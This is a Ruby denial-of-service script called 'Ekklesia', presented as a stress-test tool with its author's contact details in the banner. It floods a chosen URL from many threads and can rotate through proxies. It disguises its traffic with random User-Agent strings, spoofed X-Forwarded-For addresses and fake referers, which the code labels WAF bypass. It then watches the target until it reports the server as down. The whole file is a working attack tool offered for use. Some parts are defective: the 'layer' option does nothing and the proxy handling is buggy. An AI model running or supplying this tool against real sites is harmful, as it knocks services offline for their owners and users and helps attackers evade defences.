require 'net/http'
require 'uri'
require 'optparse'
require 'thread'

# Display the initial banner
def banner
  puts "==========================================="
  puts "          Ekklesia - Stress-Test(DDOS) Tool "
  puts "      Created by TheCybercoach              "
  puts "      Email: thecybercoach971@gmail.com     "
  puts "      Telegram:@france205                   "
  puts "==========================================="
end

# Parse command-line options
options = {}
OptionParser.new do |opts|
  opts.banner = "Usage: ruby ekklesia.rb [options]"

  opts.on("-u", "--url URL", "Target URL") do |url|
    options[:url] = url
  end

  opts.on("-t", "--threads THREADS", Integer, "Number of threads (default: 10)") do |threads|
    options[:threads] = threads
  end

  opts.on("-r", "--requests REQUESTS", Integer, "Number of requests per thread") do |requests|
    options[:requests] = requests
  end

  opts.on("-p", "--proxy PROXY_FILE", "Path to proxy list file") do |proxy_file|
    options[:proxy_file] = proxy_file
  end

  opts.on("-m", "--method METHOD", "HTTP method to use (GET, POST, HEAD, etc.)") do |method|
    options[:method] = method
  end

  opts.on("-l", "--layer LAYER", Integer, "Layer of attack: 4 (Transport Layer), 7 (Application Layer)") do |layer|
    options[:layer] = layer
  end
end.parse!

# Validate input
if options[:url].nil?
  puts "[!] Error: Target URL is required."
  exit
end

url = options[:url]
threads = options[:threads] || 10
requests_per_thread = options[:requests] || 100
proxy_file = options[:proxy_file]
method = options[:method] || "GET"
layer = options[:layer] || 7

# Load proxies if provided
proxies = []
proxy_enabled = false
if proxy_file
  begin
    proxies = File.readlines(proxy_file).map(&:strip)
    proxy_enabled = true
    puts "[+] Loaded #{proxies.size} proxies from #{proxy_file}"
  rescue Errno::ENOENT
    puts "[!] Error: Proxy file not found."
    exit
  end
end

# Display attack details banner
def attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, layer)
  puts "==========================================="
  puts "           Ekklesia - Attack Details        "
  puts "==========================================="
  puts "Tool:       Ekklesia"
  puts "Author:     TheCybercoach"
  puts "Email:      thecybercoach971@gmail.com"
  puts "Target:     #{url}"
  puts "Threads:    #{threads}"
  puts "Requests:   #{requests_per_thread} per thread"
  puts "Proxy:      #{proxy_enabled ? 'Yes' : 'No'}"
  puts "Method:     #{method}"
  puts "Layer:      #{layer}"
  puts "==========================================="
end

# Function to send requests with WAF bypass
def send_request(url, method, proxy = nil)
  uri = URI.parse(url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == "https")

  if proxy
    proxy_uri = URI.parse("http://#{proxy}") unless proxy.start_with?("http://", "https://")
    http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
  end

  begin
    headers = {
      "User-Agent" => "Mozilla/#{rand(5..10)}.0 (Windows NT #{rand(6..10)}.#{rand(0..3)}) Gecko/#{rand(20100101..20221231)} Firefox/#{rand(50..100)}",
      "X-Forwarded-For" => "#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}",
      "Referer" => "https://google.com/search?q=#{rand(1000)}"
    }

    request = case method.upcase
              when "GET"
                Net::HTTP::Get.new(uri.request_uri, headers)
              when "POST"
                Net::HTTP::Post.new(uri.request_uri, headers).tap { |r| r.set_form_data({ key: "value" }) }
              when "HEAD"
                Net::HTTP::Head.new(uri.request_uri, headers)
              else
                raise "[!] Unsupported HTTP method: #{method}"
              end

    response = http.request(request)
    puts "[+] Request sent via #{proxy || 'direct connection'} - Response: #{response.code}"

    return response.code.to_i
  rescue => e
    puts "[!] Error: #{e.message}"
    return 0
  end
end

# Function to monitor server status
def check_server_status(url)
  puts "[+] Monitoring server status..."
  loop do
    code = send_request(url, "GET")
    if code == 0 || code >= 500
      puts "[ALERT] Server is down or unresponsive!"
      break
    end
    sleep(5)
  end
end

# Main stress test logic
def stress_test(url, threads, requests_per_thread, proxies, method)
  thread_pool = []
  proxies_cycle = proxies.cycle

  threads.times do
    thread_pool << Thread.new do
      requests_per_thread.times do
        proxy = proxies.any? ? proxies_cycle.next : nil
        send_request(url, method, proxy)
      end
    end
  end

  thread_pool.each(&:join)
end

# Main script logic
banner
attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, layer)
stress_test(url, threads, requests_per_thread, proxies, method)
check_server_status(url)
